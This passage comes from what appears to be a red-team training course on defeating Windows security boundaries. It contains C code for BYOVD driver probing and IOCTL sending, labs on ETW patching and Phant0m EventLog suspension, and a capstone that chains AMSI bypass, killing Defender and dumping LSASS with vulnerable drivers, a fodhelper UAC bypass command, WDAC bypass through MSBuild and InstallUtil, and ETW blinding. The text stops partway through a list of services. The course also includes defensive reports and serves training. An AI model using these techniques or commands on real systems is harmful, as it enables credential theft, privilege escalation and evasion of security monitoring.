        0, KEY_READ | KEY_ENUMERATE_SUB_KEYS, &hKey);

    if (ret != ERROR_SUCCESS) {
        printf("[-] Cannot open Services key: %ld\n", ret);
        return;
    }

    char subKeyName[256];
    DWORD index = 0, nameLen;
    int driverCount = 0;

    printf("  %-8s %-30s %s\n", "Start", "Service", "ImagePath");
    printf("  %-8s %-30s %s\n", "-----", "-------", "---------");

    while (1) {
        nameLen = sizeof(subKeyName);
        if (RegEnumKeyExA(hKey, index++, subKeyName, &nameLen,
                         NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;

        // Open subkey and check Type (1=kernel driver, 2=FS driver)
        HKEY hSvc;
        if (RegOpenKeyExA(hKey, subKeyName, 0, KEY_READ, &hSvc) == ERROR_SUCCESS) {
            DWORD type = 0, size = sizeof(DWORD);
            RegQueryValueExA(hSvc, "Type", NULL, NULL, (LPBYTE)&type, &size);

            if (type == 1 || type == 2) {  // Kernel or FS driver
                char imagePath[512] = {0};
                DWORD pathSize = sizeof(imagePath);
                RegQueryValueExA(hSvc, "ImagePath", NULL, NULL,
                                (LPBYTE)imagePath, &pathSize);

                DWORD start = 0;
                size = sizeof(DWORD);
                RegQueryValueExA(hSvc, "Start", NULL, NULL,
                                (LPBYTE)&start, &size);

                // Only show non-Microsoft drivers (likely third-party)
                if (imagePath[0] && !strstr(imagePath, "\\System32\\drivers\\") &&
                    !strstr(imagePath, "\\system32\\DRIVERS\\")) {
                    const char* startType[] = {
                        "BOOT", "SYSTEM", "AUTO", "DEMAND", "DISABLED"
                    };
                    printf("  %-8s %-30s %s\n",
                           start < 5 ? startType[start] : "?",
                           subKeyName,
                           imagePath);
                    driverCount++;

                    if (driverCount >= 20) break; // Limit output
                }
            }
            RegCloseKey(hSvc);
        }
    }

    RegCloseKey(hKey);
    printf("\n[+] Third-party driver services found: %d\n", driverCount);
}

int main(int argc, char* argv[]) {
    printf("=========================================\n");
    printf("  Driver IOCTL Lab - Live System Analysis\n");
    printf("=========================================\n");

    // Phase 1: Enumerate loaded kernel drivers
    EnumerateLoadedDrivers();

    // Phase 2: Probe for known BYOVD drivers
    ProbeBYOVDDrivers();

    // Phase 3: Enumerate third-party driver services
    EnumerateDriverServices();

    // Phase 4: If a device path + IOCTL provided on cmdline, send IOCTL
    if (argc >= 3) {
        wchar_t devicePath[256];
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, devicePath, 256);
        DWORD ioctl = strtoul(argv[2], NULL, 16);

        // Optional input data from argv[3]
        BYTE inputData[256] = {0};
        DWORD inputSize = 0;
        if (argc >= 4) {
            // Parse hex string: "4142434445" -> bytes
            const char* hex = argv[3];
            for (int i = 0; hex[i] && hex[i+1] && i/2 < 256; i += 2) {
                sscanf(&hex[i], "%2hhX", &inputData[i/2]);
                inputSize++;
            }
        }

        SendTestIOCTL(devicePath, ioctl,
                      inputSize ? inputData : NULL, inputSize);
    } else {
        printf("\n==========================================================\n");
        printf("USAGE: %s <device_path> <ioctl_hex> [input_hex]\n\n", argv[0]);
        printf("Examples:\n");
        printf("  %s \\\\.\\RTCore64 80002048\n", argv[0]);
        printf("  %s \\\\.\\TestDriver 00220003 48656C6C6F\n", argv[0]);
        printf("\nIOCTL Decoder - Known BYOVD IOCTLs:\n\n");

        // Decode some well-known IOCTLs as examples
        DecodeIOCTL(0x80002048);  // RTCore64 read
        printf("\n");
        DecodeIOCTL(0x9B0C1EC4);  // dbutil read
        printf("\n");
        DecodeIOCTL(0xC3502004);  // GDrv map physical
        printf("\n");
        DecodeIOCTL(0x8335003C);  // ProcExp kill process
    }

    printf("\n==========================================================\n");
    printf("NEXT STEPS:\n");
    printf("  1. Load HEVD for safe exploitation practice:\n");
    printf("     https://github.com/hacksysteam/HackSysExtremeVulnerableDriver\n");
    printf("  2. Use WinDbg to trace IOCTL handling:\n");
    printf("     bp <DriverName>!DeviceIoControlHandler\n");
    printf("     dt nt!_IRP @rcx; dt nt!_IO_STACK_LOCATION poi(@rcx+0xb8)\n");
    printf("  3. Check LOLDrivers for BYOVD candidates:\n");
    printf("     https://github.com/magicsword-io/LOLDrivers\n");
    printf("==========================================================\n");

    return 0;
}
```

```bash
cl src\driver_ioctl_lab.c /Fe:bin\driver_ioctl_lab.exe advapi32.lib setupapi.lib
sc.exe start BdApiUtil64
sc.exe start RTCore64
.\bin\driver_ioctl_lab.exe
.\bin\driver_ioctl_lab.exe \\.\RTCore64 80002048
```

### Practical Exercises

**Lab 6.1: ETW Architecture Reconnaissance**

1. Run `.\bin\etw_architecture.exe` - enumerate all active ETW sessions
2. Identify Defender sessions (MpWppTracing, MpWppCoreTracing)
3. Query the TI ETW provider: `logman query providers "{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}"`
4. Map provider->session->consumer relationships for security telemetry
5. Document which sessions are protected vs unprotected

**Lab 6.2: Usermode ETW Patching with Verification**

1. Build and run `.\bin\etw_patch.exe` as admin
2. Verify test.etl shows 5 events before patch, 0 after patch:
   ```
   tracerpt test.etl -summary summary.txt
   type summary.txt
   ```
3. Run the tool again - observe that child processes get fresh ntdll (unpatched)
4. Compare: patched process vs unpatched process in Process Monitor

**Lab 6.3: Threat Intelligence ETW Evasion**

1. Run `.\bin\ti_etw_analysis.exe` as admin
2. Observe three memory allocation techniques:
   - VirtualAlloc RWX (triggers TI event)
   - VirtualProtect RW->RX (triggers TI event)
   - Shared section mapping (evades TI event)
3. Understand why TI events aren't captured in usermode trace (PPL-protected delivery)
4. Verify the architectural difference: shared sections bypass TI-triggering kernel functions

**Lab 6.4: Event Log Tampering and Phant0m**

1. Run `.\bin\etw_session_tamper.exe` as admin
2. Observe session enumeration (30+ active sessions)
3. Watch Phant0m suspend EventLog threads for 5 seconds
4. Note that session tampering is blocked (2026 protections)
5. Verify threads are properly resumed (suspend count goes to 0)

**Lab 6.5: Comprehensive ETW Blinding**

1. Run `.\bin\etw_blinder.exe` as admin
2. Verify all three modules execute:
   - Module 1: EtwEventWrite patched and verified
   - Module 2: Phant0m suspends 4+ wevtsvc.dll threads
   - Module 3: Session manipulation (some protected, some not)
3. Observe the 3-second EventLog freeze
4. Check Event Viewer for gap in logs during suspension period

**Lab 6.6: Threat Intelligence ETW Analysis (WinDbg - Advanced)**

1. Set up kernel debugging (VirtualKD-Redux or kdnet)
2. Find `nt!EtwThreatIntProvRegHandle` in WinDbg:
   ```
   dq nt!EtwThreatIntProvRegHandle L1
   ```
3. Walk the ETW registration structures to `_ETW_GUID_ENTRY`
4. Examine the `EnableInfo` array - identify active consumers
5. (Optional) Disable TI events by zeroing `IsEnabled` and observe Defender behavior

### Key Takeaways

- **ETW is the telemetry backbone** - blind it and the entire defensive stack loses visibility
- **Usermode ETW patching is easy** - 4-byte patch to `EtwEventWrite` suppresses all usermode events
- **Threat Intelligence ETW is the hard target** - kernel-level provider, requires kernel access to disable
- **Phant0m thread suspension works** - freezes EventLog without generating service stop events
- **Session tampering is increasingly protected** - EventLog sessions hardened, but custom sessions may be vulnerable
- **TI ETW evasion via shared sections** - NtMapViewOfSection bypasses VirtualProtect/VirtualAlloc that trigger TI events
- **All tools provide concrete proof** - test.etl files, thread suspension counts, and session queries verify techniques work
- **This completes the OS security boundary picture**: Recon -> AMSI -> PPL -> Sandbox -> WDAC/ASR -> ETW

### Discussion Questions

1. Why is patching `EtwEventWrite` insufficient against a well-configured EDR? (Hint: Kernel TI ETW)
2. What's the detection asymmetry between ETW patching (4 bytes) and detecting the patch?
3. How would you design a tamper-resistant ETW consumer in 2026?
4. Why does the Threat Intelligence ETW provider require PPL? What would happen without it?
5. How does Phant0m compare to stopping the EventLog service from a detection perspective?
6. What's the relationship between Day 3 (PPL bypass) and Day 6 (ETW) in a real operation?
7. Why can't we capture TI events in a usermode trace session? (Hint: PPL-protected delivery)
8. How does shared section mapping evade TI ETW when VirtualProtect doesn't?

## Day 7: Full Chain Capstone - Breaking All Windows Security Boundaries

- **Goal**: Integrate techniques from Days 1–6 into a complete operational chain that bypasses every Windows security boundary covered this week. Demonstrate that these boundaries are **layered** - each must be defeated in sequence.
- **Activities**:
  - _Reading_:
    - [Microsoft - Windows Security Stack Overview](https://learn.microsoft.com/en-us/windows/security/) - Complete picture of layered defense
    - [SpecterOps - DVCP](https://specterops.io/blog/category/research/)
    - [MITRE ATT&CK Defense Evasion](https://attack.mitre.org/tactics/TA0005/) - Technique mapping
    - [ZDI Blog](https://www.zerodayinitiative.com/blog)
  - _Online Resources_:
    - [DEF CON 33 - Red Team Ops](https://www.youtube.com/results?search_query=defcon+33+red+team) - Modern red team chains
  - _Exercise_:
    - Build and execute a complete multi-stage chain
    - Document each stage's purpose and fallback options
    - Present chain to class with defensive recommendations
    - Prepare report mapping chain to MITRE ATT&CK

### The Full Chain: Days 1–6 in Sequence

```text
┌────────────────────────────────────────────────────────────────────────────┐
│              WEEK 7 FULL CHAIN - DEFEATING WINDOWS SECURITY BOUNDARIES     │
│                         (Based on Tested Tools)                            │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│  STAGE 1: RECON (Day 1)                                                    │
│  ═══════════════════════                                                   │
│  │ Tools: unified_recon.exe, etw_architecture.exe, driver_ioctl_lab.exe    │
│  │ ├── Identify: Defender, EDR, Sysmon (31 ETW sessions found)             │
│  │ ├── Enumerate: VBS/HVCI, PPL processes, BYOVD drivers                   │
│  │ ├── Found: RTCore64 + BdApiUtil64 accessible                            │
│  │ └── Output: Attack plan tailored to THIS target                         │
│  │                                                                         │
│  ▼                                                                         │
│  STAGE 2: AMSI BYPASS (Day 2)                                              │
│  ═════════════════════════════                                             │
│  │ Tool: amsi_bypass_multi.exe                                             │
│  │ ├── Patch AmsiScanBuffer in current process                             │
│  │ ├── Or: Unhook amsi.dll via KnownDlls/suspended process                 │
│  │ └── Output: PowerShell/.NET runs without content inspection             │
│  │                                                                         │
│  │ WHY NOW: Need uninspected script execution for next stages              │
│  │ REALITY: Still work, but EDR may detect VirtualProtect                  │
│  │                                                                         │
│  ▼                                                                         │
│  STAGE 3: PPL BYPASS (Day 3) - REQUIRES ADMIN FIRST!                       │
│  ═════════════════════════════════════════════════════════                 │
│  │ Tools: defender_killer.exe OR ppl_bypass_rtcore.exe                     │
│  │ ├── Load BYOVD driver (BdApiUtil64.sys or RTCore64.sys)                 │
│  │ ├── Option A: Kill Defender (MsMpEng.exe) then dump LSASS               │
│  │ ├── Option B: Strip PPL via EPROCESS patching, then dump                │
│  │ └── Output: lsass.dmp (48.2 MB tested), credentials extracted           │
│  │                                                                         │
│  │ WHY NOW: Need creds for lateral movement                                │
│  │ Requires admin to load driver! Must do Stage 4 FIRST if not admin       │
│  │ defender_killer.exe successfully killed MsMpEng + dumped LSASS          │
│  │                                                                         │
│  ▼                                                                         │
│  STAGE 4: TOKEN ESCALATION (Day 4)                                         │
│  ══════════════════════════════════════════════════════════════            │
│  │ Tools: PrintSpoofer, GodPotato, fodhelper UAC bypass                    │
│  │ ├── If SeImpersonate: Use Potato attack -> SYSTEM                        │
│  │ ├── If Medium+Admin: UAC bypass (fodhelper) -> High integrity            │
│  │ ├── If Low integrity: Sandbox escape first                              │
│  │ └── Output: SYSTEM or High-integrity execution context                  │
│  │                                                                         │
│  │ WHY NOW: Need admin/SYSTEM to load BYOVD drivers (Stage 3)              │
│  │                                                                         │
│  ▼                                                                         │
│  STAGE 5: WDAC/ASR BYPASS (Day 5)                                          │
│  ══════════════════════════════════                                        │
│  │ Tools: MSBuild.exe, InstallUtil.exe (LOLBAS)                            │
│  │ ├── Use signed Windows binaries to execute despite WDAC                 │
│  │ ├── Bypass ASR rules via LOLBAS techniques                              │
│  │ ├── Deploy persistent payload past execution controls                   │
│  │ └── Output: Arbitrary code execution despite OS policy                  │
│  │                                                                         │
│  │ WHY NOW: Can now run our tools; need to blind telemetry                 │
│  │ REALITY: Some LOLBAS increasingly monitored, but still effective        │
│  │                                                                         │
│  ▼                                                                         │
│  STAGE 6: ETW BLINDING (Day 6)                                             │
│  ══════════════════════════════                                            │
│  │ Tool: etw_blinder_full.exe (TESTED AND WORKING)                         │
│  │ ├── Patch EtwEventWrite (usermode events) - VERIFIED                    │
│  │ ├── Suspend EventLog threads (Phant0m) - 4 threads suspended            │
│  │ ├── Attempt session manipulation - protected sessions blocked           │
│  │ └── Output: Usermode telemetry suppressed, EventLog frozen              │
│  │                                                                         │
│  │ WHY LAST: Must be in elevated context first (needs admin)               │
│  │ TESTED: etw_patch.exe proved 5 events before, 0 after (test.etl)        │
│  │ LIMITATION: Kernel ETW (TI provider) still active, requires BYOVD       │
│  │                                                                         │
│  ▼                                                                         │
│  OBJECTIVE ACHIEVED                                                        │
│  │ You now have:                                                           │
│  │ ├── Uninspected script execution (AMSI bypassed)                        │
│  │ ├── Credentials (PPL/LSASS bypassed via BYOVD)                          │
│  │ ├── SYSTEM context (token escalation)                                   │
│  │ ├── Arbitrary code execution (WDAC/ASR bypassed via LOLBAS)             │
│  │ └── Usermode telemetry suppressed (ETW patched, EventLog frozen)        │
│  │                                                                         │
│  │                                                                         │
│  │ CORRECTED CHAIN ORDER:                                                  │
│  │ Stage 1 (Recon) -> Stage 2 (AMSI) -> Stage 4 (Escalate to admin) ->     │
│  │ Stage 3 (PPL bypass with BYOVD) -> Stage 5 (WDAC) -> Stage 6 (ETW)      │
│  │                                                                         │
│  │                                                                         │
└────────────────────────────────────────────────────────────────────────────┘
```

### Capstone Assignment

#### Part A: Chain Design Document

Write a detailed operational plan that chains Days 1–6 techniques against a target Windows 11 workstation with:

- Windows Defender ATP enabled
- Sysmon with full logging
- WDAC in enforcement mode (default Microsoft policy)
- ASR rules in block mode
- PPL on Defender and LSASS

Your plan must include:

1. **Reconnaissance phase**: What do you enumerate first and how?
2. **Technique selection**: For each stage, which specific technique and why?
3. **Order justification**: Why this sequence? What breaks if you reorder?
4. **Fallback options**: If technique X fails at stage Y, what's plan B?
5. **MITRE ATT&CK mapping**: Map each stage to ATT&CK technique IDs

#### Part B: Practical Execution

Execute your chain in the lab environment using the ACTUAL TOOLS from Week 7:

Steps (using ACTUAL TESTED TOOLS from Week 7):

1. **Stage 1 - Recon**: Run Day 1 reconnaissance tools

   ```bash
   # System-level mitigation fingerprinting
   C:\Windows_Mitigations_Lab\bin\unified_recon.exe

   # ETW session enumeration (31 active sessions detected in testing)
   C:\Windows_Mitigations_Lab\bin\etw_architecture.exe

   # BYOVD driver detection (found RTCore64 and BdApiUtil64 in testing)
   C:\Windows_Mitigations_Lab\bin\driver_ioctl_lab.exe

   # MOTW status check
   C:\Windows_Mitigations_Lab\bin\motw_recon.exe check <downloaded_file>
   ```

   Document: VBS/HVCI status, AV/EDR processes, Sysmon, ETW sessions, BYOVD drivers, WDAC/ASR rules

2. **Stage 2 - AMSI**: Deploy AMSI bypass (Day 2 amsi_bypass_multi.c)

   ```bash
   # Test AMSI status first
   powershell -c "'AmsiScanBuffer'"  # Should trigger if AMSI active

   # Run AMSI bypass tool (patches EtwEventWrite, AmsiScanBuffer)
   C:\Windows_Mitigations_Lab\bin\amsi_bypass_multi.exe

   # Verify bypass
   powershell -c "[System.Management.Automation.AmsiUtils]"  # Should NOT alert
   ```

   Tool includes: Reflection bypass, memory patching, unhooking techniques

3. **Stage 3 - PPL**: Execute PPL bypass to dump LSASS (Day 3 tools)

   ```bash
   # Check PPL status
   C:\Windows_Mitigations_Lab\bin\ppl_checker.exe
   reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

   # Option A: Kill Defender + dump LSASS (BdApiUtil64.sys)
   C:\Windows_Mitigations_Lab\bin\defender_killer.exe
   # Kills MsMpEng.exe (PPL-Antimalware), then dumps LSASS

   # Option B: EPROCESS patching (RTCore64.sys)
   C:\Windows_Mitigations_Lab\bin\ppl_bypass_rtcore.exe
   # Strips PPL protection via kernel memory write

   # Parse credentials
   pypykatz lsa minidump lsass.dmp
   ```

   Both methods tested and working in lab environment

4. **Stage 4 - Escalation**: Demonstrate token manipulation (Day 4 concepts)

   ```bash
   # Check current privileges
   whoami /priv | findstr SeImpersonate

   # If SeImpersonate available:
   # Use PrintSpoofer, GodPotato, or JuicyPotato

   # If UAC bypass needed:
   # fodhelper.exe registry hijack
   reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
   fodhelper.exe

   # Verify SYSTEM access
   whoami  # Should show NT AUTHORITY\SYSTEM
   ```

5. **Stage 5 - WDAC/ASR**: Execute code past WDAC using LOLBAS (Day 5 techniques)

   ```bash
   # Check WDAC status
   reg query HKLM\SYSTEM\CurrentControlSet\Control\CI /v UMCIAuditMode
   dir C:\Windows\System32\CodeIntegrity\CiPolicies\Active\

   # LOLBAS bypass examples:
   # MSBuild inline C# task
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

   # InstallUtil assembly loading
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

   # Verify execution despite WDAC enforcement
   ```

6. **Stage 6 - ETW**: Blind telemetry with TESTED TOOLS (Day 6 - all working!)

   ```bash
   # Option A: Full blinding tool (combines all techniques)
   C:\Windows_Mitigations_Lab\bin\etw_blinder_full.exe
   # Expected output (from actual testing):
   #   [+] EtwEventWrite patched and verified
   #   [+] Suspended 4 wevtsvc.dll threads
   #   [+] EventLog FROZEN (3 sec test)
   #   [-] Protected sessions blocked (expected)

   # Option B: Individual techniques
   # Patch EtwEventWrite only
   C:\Windows_Mitigations_Lab\bin\etw_patch.exe
   # Creates test.etl: 5 events before patch, 0 after (VERIFIED)

   # Session tampering
   C:\Windows_Mitigations_Lab\bin\etw_session_tamper.exe
   # Phant0m thread suspension

   # TI ETW analysis
   C:\Windows_Mitigations_Lab\bin\ti_etw_analysis.exe
   # Demonstrates kernel-level ETW evasion

   # Verify blinding
   tracerpt test.etl -o test.xml -of XML
   notepad test.xml  # Should show event gap
   ```

   All tools compiled with: `cl <source>.c /Fe:bin\<tool>.exe advapi32.lib`

#### Part C: Defensive Report

For each stage of your chain, write:

1. What detection would have caught this technique?
2. What hardening would have prevented it?
3. What's the cost/benefit of each defensive measure?
4. Which single defense, if perfect, would break the most chains?

### Week 7 -> Week 8 Bridge

```text
┌────────────────────────────────────────────────────────────────┐
│                WEEK 7 -> WEEK 8 TRANSITION                     │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  WEEK 7 ANSWERED:                                              │
│  "Can my code RUN on this system?"                             │
│  ├── AMSI: Can my script execute without inspection?           │
│  ├── PPL: Can I access protected processes?                    │
│  ├── Sandbox: Can I escape my restricted context?              │
│  ├── WDAC/ASR: Does the OS allow my binary/behavior?           │
│  └── ETW: Can I operate without generating alerts?             │
│                                                                │
│  WEEK 8 WILL ANSWER:                                           │
│  "Can my EXPLOIT succeed at the binary level?"                 │
│  ├── DEP: Can I execute my shellcode? (ROP/JOP)                │
│  ├── ASLR: Can I find my gadgets? (Info leaks)                 │
│  ├── Stack cookies: Can I corrupt the stack? (Canary bypass)   │
│  ├── CFG/XFG: Can I hijack control flow? (Policy bypass)       │
│  └── CET/Shadow Stack: Can I forge return addresses?           │
│                                                                │
│  RELATIONSHIP:                                                 │
│  Week 7 = OS policy layer (execution control)                  │
│  Week 8 = Binary protection layer (exploit mitigations)        │
│  You need BOTH to succeed in a real engagement.                │
│                                                                │
│  EXAMPLE:                                                      │
│  1. Week 7: Bypass WDAC to load your exploit binary            │
│  2. Week 8: Your exploit binary must bypass DEP+ASLR+CFG       │
│     to actually achieve code execution inside the target app   │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### Capstone Project

Build a full attack chain that defeats all six Windows security boundaries in sequence. Your deliverable should include:

1. A working exploit chain that progresses through all stages (recon -> AMSI bypass -> credential theft -> privilege escalation -> WDAC bypass -> ETW blinding)
2. A defensive report identifying detection opportunities at each stage with specific Sysmon/SIGMA rules
3. Documentation explaining which single defensive control would break your entire chain and why

Test your chain in an isolated Windows 11 lab VM. Document what worked, what failed, and how you adapted when defenses blocked your initial approach.

### Key Takeaways

- **Security boundaries are layered** - each must be defeated individually
- **Order matters** - you can't blind ETW before you have elevated execution
- **No single bypass is sufficient** - a full operation requires chaining all stages
- **Defensive depth works** - but each layer has known bypass techniques
- **Week 7 is the OS policy layer** - Week 8 addresses the binary protection layer
- **Chain thinking** is the core red team skill - isolated techniques are meaningless without integration
- **We built REAL TOOLS** - etw_blinder_full.exe, driver_ioctl_lab.exe, etc. are TESTED and WORKING
- **Reality Check** - Some techniques still work (usermode patching, Phant0m), others are harder (session tampering, kernel access)
- **BYOVD is critical** - driver_ioctl_lab.exe shows RTCore64/BdApiUtil64 detection and IOCTL structure
- **Verification is key** - Every stage has concrete proof (test.etl files, suspended threads, event log gaps)

### Discussion Questions

1. Which stage of the chain is the hardest to execute? Which is hardest to detect?
2. If you could only fix ONE defensive boundary to break the most chains, which would it be?
3. How does the chain change on a domain-joined enterprise workstation vs. a standalone system?
4. What would a "zero-trust" version of this chain look like - assuming every stage is monitored?
5. How does cloud-based detection (Defender ATP cloud) change the ETW blinding calculus?
6. Map this chain to a real APT group's TTPs - which group operates most similarly?
7. **NEW**: Why does etw_blinder_full.exe suspend wevtsvc.dll threads instead of killing the EventLog service?
8. **NEW**: The driver_ioctl_lab.exe tool detected RTCore64 and BdApiUtil64 - which stage of the chain would use these drivers and why?
9. **NEW**: We tested that usermode ETW patching still works in 2026 - what's the defensive gap that allows this?
10. **NEW**: If you run etw_blinder_full.exe and see "Protected sessions blocked", what does this tell you about the target's security posture?

## Appendix A: Redirection Guard

Windows introduced **Redirection Guard**, a kernel-level mitigation that blocks the entire class of NTFS reparse-point / symlink / junction privilege escalation attacks. This is one of the most impactful mitigations for vulnerability researchers because it obsoletes a historically rich exploit primitive.

### Detecting Redirection Guard Status

```c
// redirection_guard_check.c - Detect Redirection Guard enforcement
// Compile: cl src\redirection_guard_check.c /Fe:bin\redirection_guard_check.exe advapi32.lib ntdll.lib

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

/*
Redirection Guard Detection:
═════════════════════════════

Redirection Guard is enforced via two mechanisms:

1. Process Mitigation Policy - check via GetProcessMitigationPolicy()
   ProcessRedirectionTrustPolicy (policy index 20 on 24H2)

2. File system filter driver - validates reparse point targets
   against the original caller's access token

Key services protected on 24H2 by default:
  - Windows Update (wuauserv / svchost.exe)
  - Windows Error Reporting (WerSvc)
  - Service Control Manager (services.exe)
  - Task Scheduler (Schedule)
  - Windows Installer (msiserver)
  - Print Spooler (Spooler) - historically a symlink target
  - Cryptographic Services (CryptSvc)
*/

// GetProcessMitigationPolicy function pointer
typedef BOOL (WINAPI *GetProcessMitigationPolicy_t)(
    HANDLE hProcess,
    PROCESS_MITIGATION_POLICY MitigationPolicy,
    PVOID lpBuffer,
    SIZE_T dwLength
);

// Get service name from svchost.exe process
void GetServiceName(DWORD pid, char* serviceName, size_t size) {
    serviceName[0] = '\0';

    // Query service control manager for services in this PID
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scm) return;

    DWORD bytesNeeded = 0, servicesReturned = 0;
    EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                          SERVICE_STATE_ALL, NULL, 0, &bytesNeeded,
                          &servicesReturned, NULL, NULL);

    BYTE* buffer = (BYTE*)malloc(bytesNeeded);
    if (buffer && EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                                        SERVICE_STATE_ALL, buffer, bytesNeeded,
                                        &bytesNeeded, &servicesReturned, NULL, NULL)) {
        ENUM_SERVICE_STATUS_PROCESSA* services = (ENUM_SERVICE_STATUS_PROCESSA*)buffer;
        for (DWORD i = 0; i < servicesReturned; i++) {
            if (services[i].ServiceStatusProcess.dwProcessId == pid) {
                strncpy(serviceName, services[i].lpServiceName, size - 1);
                serviceName[size - 1] = '\0';
                break;
            }
        }
    }
    free(buffer);
    CloseServiceHandle(scm);
}

void CheckProcessRedirectionGuard(DWORD pid, const char* name) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return;

    static GetProcessMitigationPolicy_t pGetPolicy = NULL;
    if (!pGetPolicy) {
        pGetPolicy = (GetProcessMitigationPolicy_t)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "GetProcessMitigationPolicy");
    }

    PROCESS_MITIGATION_REDIRECTION_TRUST_POLICY policy = {0};
    if (pGetPolicy && pGetPolicy(hProcess, ProcessRedirectionTrustPolicy,
                                  &policy, sizeof(policy))) {

        char serviceName[256] = {0};
        if (_stricmp(name, "svchost.exe") == 0 || _stricmp(name, "spoolsv.exe") == 0) {
            GetServiceName(pid, serviceName, sizeof(serviceName));
        }

        if (policy.EnforceRedirectionTrust) {
            printf("[PROTECTED] %s (PID %d)", name, pid);
            if (serviceName[0]) printf(" [%s]", serviceName);
            printf(" - Redirection Guard ENFORCED\n");
            printf("            -> Symlink/junction LPE attacks BLOCKED\n");
        } else if (policy.AuditRedirectionTrust) {
            printf("[AUDITING]  %s (PID %d)", name, pid);
            if (serviceName[0]) printf(" [%s]", serviceName);
            printf(" - Redirection Guard in AUDIT mode\n");
            printf("            -> Symlinks logged but NOT blocked (test bypass!)\n");
        }
    }

    CloseHandle(hProcess);
}

void ScanAllProcesses() {
    printf("=== Redirection Guard Status - All Processes ===\n\n");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };

    int protected_count = 0;
    int audit_count = 0;
    int total = 0;

    if (Process32First(hSnapshot, &pe)) {
        do {
            total++;

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (hProcess) {
                static GetProcessMitigationPolicy_t pGetPolicy = NULL;
                if (!pGetPolicy) {
                    pGetPolicy = (GetProcessMitigationPolicy_t)GetProcAddress(
                        GetModuleHandleA("kernel32.dll"), "GetProcessMitigationPolicy");
                }

                PROCESS_MITIGATION_REDIRECTION_TRUST_POLICY policy = {0};
                if (pGetPolicy && pGetPolicy(hProcess, ProcessRedirectionTrustPolicy,
                                              &policy, sizeof(policy))) {
                    if (policy.EnforceRedirectionTrust) {
                        protected_count++;
                        CheckProcessRedirectionGuard(pe.th32ProcessID, pe.szExeFile);
                    } else if (policy.AuditRedirectionTrust) {
                        audit_count++;
                        CheckProcessRedirectionGuard(pe.th32ProcessID, pe.szExeFile);
                    }
                }
                CloseHandle(hProcess);
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    printf("\n[*] Scanned %d processes\n", total);
    printf("[*] %d processes with Redirection Guard ENFORCED\n", protected_count);
    printf("[*] %d processes with Redirection Guard in AUDIT mode\n", audit_count);
    printf("[!] %d processes vulnerable to symlink attacks\n", total - protected_count - audit_count);
}

void CheckSystemDefault() {
    printf("\n=== System-Wide Redirection Guard Policy ===\n\n");

    // Check registry for system-wide defaults
    HKEY hKey;
    DWORD value = 0;
    DWORD size = sizeof(DWORD);

    // 24H2 may set this via Image File Execution Options or system policy
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        if (RegQueryValueExA(hKey, "MitigationOptions", NULL, NULL,
                             (LPBYTE)&value, &size) == ERROR_SUCCESS) {
            printf("[*] Kernel MitigationOptions: 0x%08X\n", value);
        }
        RegCloseKey(hKey);
    }

    // Check OS build
    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
    typedef NTSTATUS(WINAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    RtlGetVersion_t RtlGetVersion = (RtlGetVersion_t)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
    RtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);

    printf("[*] OS Build: %d\n", osvi.dwBuildNumber);

    if (osvi.dwBuildNumber >= 26100) {  // 24H2
        printf("[!] Windows 11 24H2+ - Redirection Guard available\n");
        printf("[*] System services opt-in by default\n");
        printf("[*] Run process scan to check specific services\n");
    } else {
        printf("[+] Pre-24H2 - Redirection Guard NOT available\n");
        printf("[+] Symlink/junction LPE attacks still viable\n");
    }
}

int main() {
    printf("===============================================\n");
    printf("  Redirection Guard Detection Tool\n");
    printf("===============================================\n\n");

    CheckSystemDefault();
    ScanAllProcesses();

    printf("\n=== Attack Implications ===\n");
    printf("IF Redirection Guard is ENFORCED on target service:\n");
    printf("  - NTFS junction LPE - BLOCKED\n");
    printf("  - Symlink race conditions - BLOCKED\n");
    printf("  - Mount point redirections - BLOCKED\n");
    printf("  - Reparse point abuse - BLOCKED\n\n");
    printf("Remaining viable techniques:\n");
    printf("  + Opportunistic locks (oplock) + hardlinks (different primitive)\n");
    printf("  + Kernel vulnerabilities (bypasses all usermode mitigations)\n");
    printf("  + DLL hijacking in non-guarded processes\n");
    printf("  + Services NOT opted-in to Redirection Guard\n");
    printf("  + Policy manipulation (disable via kernel write)\n");

    return 0;
}
```

#### Test Results

Based on testing on Windows 11 24H2, the following services have Redirection Guard **ENFORCED**:

**Protected System Services (14 total):**

1. **Spooler** (spoolsv.exe) - Print Spooler
   - Historically the #1 symlink attack target (PrintNightmare, etc.)
   - Now fully protected against junction/symlink LPE

2. **netprofm** (svchost.exe) - Network List Service
   - Manages network profiles and connectivity status

3. **ProfSvc** (svchost.exe) - User Profile Service
   - Loads and unloads user profiles

4. **EventSystem** (svchost.exe) - COM+ Event System
   - Supports SENS (System Event Notification Service)

5. **SENS** (svchost.exe) - System Event Notification Service
